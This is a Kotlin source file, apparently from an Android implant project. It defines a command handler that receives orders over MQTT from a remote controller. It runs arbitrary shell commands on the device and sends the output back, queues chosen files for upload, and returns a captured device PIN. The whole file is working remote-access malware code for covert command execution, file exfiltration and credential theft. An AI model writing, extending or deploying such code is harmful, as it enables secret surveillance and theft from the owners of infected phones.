package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import com.cooperthecoder.implant.data.DeviceProperties
import com.cooperthecoder.implant.data.SharedPreferencesQuery
import com.cooperthecoder.implant.data.UploadQueue
import org.eclipse.paho.android.service.MqttAndroidClient
import org.eclipse.paho.client.mqttv3.MqttMessage
import java.io.BufferedReader
import java.io.InputStreamReader

class CommandHandler(context: Context, val client: MqttAndroidClient) {

    companion object {
        val TAG: String = CommandHandler::class.java.name
    }

    val context: Context = context.applicationContext

    object Commands {
        const val EXECUTE = "execute"
        const val REPLY = "reply"
        const val UPLOAD = "upload"
        const val PIN = "pin"
    }

    fun handle(command: Command) {
        when (command.command) {
            Commands.EXECUTE -> {
                val shellCommand = command.arguments["shell_command"]
                if (shellCommand != null) {
                    handleExecute(command, shellCommand)
                } else {
                    reply(command, "", "Required argument: shell_command")
                }
            }

            Commands.UPLOAD -> {
                val filename = command.arguments["filename"]
                if (filename != null) {
                    handleUpload(command, filename)
                } else {
                    reply(command, "", "Required argument: filename")
                }
            }

            Commands.PIN -> {
                val pin = SharedPreferencesQuery.getNextPin(context)
                if (pin != null) {
                    handlePin(command, pin)
                } else {
                    reply(command, "", "No PIN recorded yet")
                }
            }
        }
    }

    private fun handleExecute(command: Command, shellCommand: String) {
        Log.d(TAG, "Executing: $shellCommand")
        val process = try {
            Runtime.getRuntime().exec(shellCommand)
        } catch (e: Exception) {
            Log.e(TAG, "Error running command", e)
            e.message?.let { reply(command, "", it) }
            return
        }
        process.waitFor()

        val outputReader = BufferedReader(InputStreamReader(process.inputStream))
        val errorReader = BufferedReader(InputStreamReader(process.errorStream))
        val outputBuilder = StringBuilder()
        val errorBuilder = StringBuilder()
        outputReader.forEachLine {
            outputBuilder.append(it)
        }
        errorReader.forEachLine {
            errorBuilder.append(it)
        }

        val output = outputBuilder.toString()
        val error = errorBuilder.toString()
        reply(command, output, error)
    }

    private fun handlePin(command: Command, pin: String) {
        reply(command, pin, "")
    }

    private fun handleUpload(command: Command, filename: String) {
        try {
            UploadQueue.push(filename)
        } catch (e: Exception) {
            reply(command, "", "Error: ${e.message}")
            return
        }

        reply(command, "$filename queued for upload.", "")
    }

    private fun reply(command: Command, output: String, error: String) {
        val arguments = hashMapOf(
                "nonce" to command.nonce,
                "output" to output,
                "error" to error
        )
        val reply = Command.Builder()
                .command(Commands.REPLY)
                .arguments(arguments)
                .build()

        val message = MqttMessage()
        message.payload = reply.json().toByteArray()
        client.publish(DeviceProperties.replyChannelName(context), message)
    }
}